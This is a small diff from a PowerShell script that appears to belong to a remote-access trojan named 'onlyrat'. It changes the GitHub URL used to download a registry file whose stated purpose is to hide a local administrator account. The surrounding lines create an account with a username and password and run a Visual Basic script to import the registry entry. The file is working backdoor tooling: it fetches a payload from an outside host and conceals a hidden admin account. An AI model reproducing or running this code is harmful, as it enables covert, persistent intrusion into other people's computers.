@@ -27,7 +27,7 @@ create_account -uname $uname -pword $pword
 
 # registry to hide local admin
 
-Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/main/onlyrat/files/admin.reg -OutFile "$reg_file.reg"
+Invoke-WebRequest -Uri raw.githubusercontent.com/WayneTheGod/test2/blob/main/onlyrat/files/admin.reg -OutFile "$reg_file.reg"
 
 # visual basic script to register the registry 
 
